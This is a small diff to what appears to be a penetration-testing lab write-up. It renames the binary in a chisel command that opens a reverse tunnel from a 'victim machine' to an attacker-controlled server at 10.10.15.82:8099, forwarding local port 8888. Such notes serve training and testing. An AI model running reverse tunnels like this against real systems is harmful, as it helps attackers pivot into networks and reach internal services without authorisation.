@@ -33,7 +33,7 @@ chisel server -p 8099 --reverse
 Then, on the victim machine you need to create a client, specifying which local port you would like to connect to through your reverse tunnel.
 
 ```text
-./chi.exe client 10.10.15.82:8099 R:8888:127.0.0.1:8888
+./chisel.exe client 10.10.15.82:8099 R:8888:127.0.0.1:8888
 ```
 
 ## Enumeration
